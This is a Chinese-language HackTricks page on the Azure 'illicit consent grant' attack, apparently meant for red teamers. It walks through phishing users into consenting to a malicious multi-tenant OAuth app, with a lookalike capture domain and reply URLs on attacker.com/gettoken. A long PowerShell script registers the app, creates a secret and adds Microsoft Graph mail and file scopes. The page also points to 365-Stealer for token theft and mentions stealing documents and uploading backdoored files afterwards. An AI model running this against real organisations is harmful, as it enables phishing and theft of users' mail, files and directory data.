# Az - 非法同意授予

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## OAuth应用程序钓鱼

**Azure应用程序** 请求权限以访问**用户数据**（基本信息，但也包括访问文档，发送电子邮件等）。\
如果**允许**，普通用户只能对**"低影响"权限**授予同意。在**所有其他**情况下，**需要管理员同意**。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`和包括`授予权限给应用程序的权限`的自定义角色可以提供租户范围的同意。

只有**不需要管理员同意**的权限被归类为**低影响**。这些权限是**基本登录所需的openid, profile, email, User.Read和offline\_access**。如果一个**组织** **允许**用户同意**所有应用程序**，员工可以授权一个应用程序**从他们的个人资料中读取上述信息**。

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

因此，攻击者可以准备一个**恶意应用程序**，并通过**钓鱼**，使用户**接受该应用程序并窃取他的数据**。

### 检查用户是否被允许同意

检查用户是否被允许同意应用程序：

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **禁用用户同意**：用户不能授权应用程序权限。
* **用户可以同意来自经过验证的发布者或您的组织的应用程序，但仅限于您选择的权限**：所有用户只能同意那些由经过验证的发布者发布的应用程序以及在您的租户中注册的应用程序。
* **用户可以同意所有应用程序**：允许所有用户同意任何不需要管理员同意的权限。
* **自定义应用程序同意策略**

## **什么是非法同意授予攻击？**

在非法同意授予攻击中，攻击者创建一个**Azure注册的应用程序，请求访问数据，如联系信息、电子邮件或文档**。然后，攻击者诱骗终端用户授予应用程序同意，以便攻击者能够访问目标用户可以访问的数据。应用程序被授予同意后，它可以在不需要组织账户的情况下以用户账户级别访问数据。

简单来说，当受害者点击那个美丽的蓝色“接受”按钮时，Azure AD会向属于攻击者的第三方网站发送一个令牌，攻击者将使用该令牌代表受害者执行操作，如访问所有文件、阅读邮件、发送邮件等。

## **攻击流程**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

为了对公司“ecorp”发起这种攻击，攻击者可以注册一个名为“safedomainlogin.com”的域名，并创建了一个子域名["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/)，在那里他们**托管应用程序以捕获授权码**，然后请求访问令牌。

然后，在他们的Azure AD租户中注册一个多租户应用程序，并将其命名为“ecorp”，添加了指向“ecorp.safedomainlogin.com”的重定向URL，该URL托管一个应用程序以捕获授权码。

攻击者还创建了一个新的客户端密钥，并在应用程序中添加了一些API**权限**，如`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`。这样一旦**用户授予应用程序同意**，攻击者就可以代表用户**提取**敏感信息。

攻击者最终创建了包含恶意应用程序客户端ID的**链接**，并**分享**给**目标用户**以获得他们的同意。

## 365-Stealer

您可以使用[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)执行此攻击。

作为额外步骤，如果您对受害组织中的某个用户有一些**访问权限**，您可以检查策略是否允许他**接受应用程序**：
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
为了进行这次攻击，你需要在你的Azure租户中**创建一个新的应用**（在应用注册中），例如，具有以下权限：

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` 位于 `Microsoft Graph` 的 `Delegated permissions` 中。（应用程序权限总是需要额外批准）。

* `User.ReadBasic.All` 是一个权限，如果被授权，它将允许你**读取组织中所有用户的信息**。
* 记住，只有 `GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator` 和包括`授予应用程序权限的权限`的自定义角色可以提供租户范围的同意。因此，如果你想让他批准一个**需要管理员同意的应用**，你应该**钓鱼一个拥有这些角色之一的用户**。

你也可以通过cli创建一个应用，使用：

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
```markdown
{% endcode %}

查看 [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) 学习如何配置它。

{% hint style="warning" %}
请注意，获得的**访问令牌**将用于具有以下范围的**graph端点**：`User.Read` 和 `User.ReadBasic.All`（请求的权限）。您将无法执行其他操作（但这些足以**下载组织中所有用户的信息**）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

您也可以使用这个工具来执行这个攻击。

## 后期利用

一旦您获得了用户的访问权限，您可以做一些事情，例如窃取敏感文档，甚至上传带后门的文档文件。

## 参考资料

* 本文摘自 [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
```
